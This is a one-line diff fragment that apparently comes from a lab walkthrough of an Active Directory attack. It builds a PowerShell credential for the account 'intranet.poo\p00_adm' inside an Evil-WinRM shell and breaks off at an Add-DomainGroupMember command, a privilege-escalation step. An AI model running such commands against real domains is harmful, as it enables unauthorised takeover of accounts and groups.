@@ -1,0 +1,1 @@
+cred = New-Object System.Management.Automation.PSCredential ( 'intranet.poo\p00_adm' , $pass ) *Evil-WinRM* PS C:\programdata> Add-DomainGroupMember
